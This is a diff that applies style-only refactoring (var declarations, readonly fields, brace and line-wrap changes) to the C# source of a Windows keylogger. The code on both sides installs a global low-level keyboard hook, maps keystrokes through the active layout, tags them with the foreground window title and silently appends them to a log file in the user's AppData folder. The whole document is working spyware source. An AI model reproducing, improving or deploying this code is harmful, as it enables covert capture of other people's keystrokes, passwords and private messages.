@@ -9,7 +9,9 @@ namespace Keylogger
 {
     public static class Program
     {
-        private static string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        private static readonly string ApplicationData =
+            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
         private static readonly string loggerPath = ApplicationData + @"\qwqdanchunLog.txt";
         private static string CurrentActiveWindowTitle;
 
@@ -23,7 +25,7 @@ namespace Keylogger
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
-            using (Process curProcess = Process.GetCurrentProcess())
+            using (var curProcess = Process.GetCurrentProcess())
             {
                 return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curProcess.ProcessName), 0);
             }
@@ -33,25 +35,20 @@ namespace Keylogger
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                int vkCode = Marshal.ReadInt32(lParam);
-                bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
-                bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
-                string currentKey = KeyboardLayout((uint)vkCode);
+                var vkCode = Marshal.ReadInt32(lParam);
+                var capsLock = (GetKeyState(0x14) & 0xffff) != 0;
+                var shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
+                var currentKey = KeyboardLayout((uint)vkCode);
 
                 if (capsLock || shiftPress)
-                {
                     currentKey = currentKey.ToUpper();
-                }
                 else
-                {
                     currentKey = currentKey.ToLower();
-                }
 
                 if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                     currentKey = "[" + (Keys)vkCode + "]";
 
                 else
-                {
                     switch (((Keys)vkCode).ToString())
                     {
                         case "Space":
@@ -85,15 +82,14 @@ namespace Keylogger
                             currentKey = "[Tab]";
                             break;
                         case "Capital":
-                            if (capsLock == true)
+                            if (capsLock)
                                 currentKey = "[CAPSLOCK: OFF]";
                             else
                                 currentKey = "[CAPSLOCK: ON]";
                             break;
                     }
-                }
 
-                using (StreamWriter sw = new StreamWriter(loggerPath, true))
+                using (var sw = new StreamWriter(loggerPath, true))
                 {
                     if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                     {
@@ -107,6 +103,7 @@ namespace Keylogger
                     }
                 }
             }
+
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
@@ -114,15 +111,19 @@ namespace Keylogger
         {
             try
             {
-                StringBuilder sb = new StringBuilder();
-                byte[] vkBuffer = new byte[256];
+                var sb = new StringBuilder();
+                var vkBuffer = new byte[256];
                 if (!GetKeyboardState(vkBuffer)) return "";
-                uint scanCode = MapVirtualKey(vkCode, 0);
-                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
+                var scanCode = MapVirtualKey(vkCode, 0);
+                var keyboardLayout =
+                    GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out var processId));
                 ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                 return sb.ToString();
             }
-            catch { }
+            catch
+            {
+            }
+
             return ((Keys)vkCode).ToString();
         }
 
@@ -130,10 +131,10 @@ namespace Keylogger
         {
             try
             {
-                IntPtr hwnd = GetForegroundWindow();
-                GetWindowThreadProcessId(hwnd, out uint pid);
-                Process p = Process.GetProcessById((int)pid);
-                string title = p.MainWindowTitle;
+                var hwnd = GetForegroundWindow();
+                GetWindowThreadProcessId(hwnd, out var pid);
+                var p = Process.GetProcessById((int)pid);
+                var title = p.MainWindowTitle;
                 if (string.IsNullOrWhiteSpace(title))
                     title = p.ProcessName;
                 CurrentActiveWindowTitle = title;
@@ -147,12 +148,15 @@ namespace Keylogger
 
 
         #region "Hooks & Native Methods"
+
         private const int WM_KEYDOWN = 0x0100;
-        private static LowLevelKeyboardProc _proc = HookCallback;
+        private static readonly LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod,
+            uint dwThreadId);
+
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
@@ -162,32 +166,35 @@ namespace Keylogger
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
-        private static int WHKEYBOARDLL = 13;
+
+        private static readonly int WHKEYBOARDLL = 13;
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         [DllImport("user32.dll")]
-        static extern IntPtr GetForegroundWindow();
+        private static extern IntPtr GetForegroundWindow();
 
         [DllImport("user32.dll", SetLastError = true)]
-        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true,
+            CallingConvention = CallingConvention.Winapi)]
         public static extern short GetKeyState(int keyCode);
 
         [DllImport("user32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
-        static extern bool GetKeyboardState(byte[] lpKeyState);
+        private static extern bool GetKeyboardState(byte[] lpKeyState);
 
         [DllImport("user32.dll")]
-        static extern IntPtr GetKeyboardLayout(uint idThread);
+        private static extern IntPtr GetKeyboardLayout(uint idThread);
 
         [DllImport("user32.dll")]
-        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
+        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
+            [Out] [MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
 
         [DllImport("user32.dll")]
-        static extern uint MapVirtualKey(uint uCode, uint uMapType);
+        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
+
         #endregion
-
     }
 }
